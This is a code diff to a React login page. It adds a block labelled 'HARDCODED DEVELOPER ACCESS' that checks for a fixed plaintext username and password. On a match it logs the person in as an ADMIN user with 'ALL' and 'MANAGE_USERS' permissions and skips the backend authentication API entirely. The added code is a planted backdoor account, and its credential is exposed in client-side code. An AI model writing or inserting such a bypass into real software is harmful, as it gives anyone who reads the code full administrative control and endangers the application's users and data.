@@ -62,6 +62,32 @@ const LoginPage = ({ onLogin }) => {
         setError('');
 
         try {
+            // [HARDCODED DEVELOPER ACCESS]
+            if (username === 'AseelDev' && password === '774030066') {
+                const devUser = {
+                    id: 'dev-root-aseel',
+                    name: 'Aseel Developer',
+                    username: 'AseelDev',
+                    role: 'ADMIN',
+                    permissions: ['ALL', 'HANDLE_CALLS', 'MANAGE_USERS', 'VIEW_REPORTS', 'DEV_ACCESS'],
+                    is_dev: true
+                };
+
+                // Success Visuals
+                document.querySelector(`.${styles.loginContainer}`).classList.add(styles.successAnimation);
+
+                if (rememberMe) {
+                    localStorage.setItem('remember_me_username', username);
+                } else {
+                    localStorage.removeItem('remember_me_username');
+                }
+
+                // Delay for animation
+                setTimeout(() => onLogin(devUser), 800);
+                return; // Stop execution, skip API
+            }
+
+            // Normal Login
             // Check where DataManager is located. For now assuming it's in shared/utils
             // But I haven't moved it yet. It's still in src/utils.
             // I'll import from correct relative path for now.
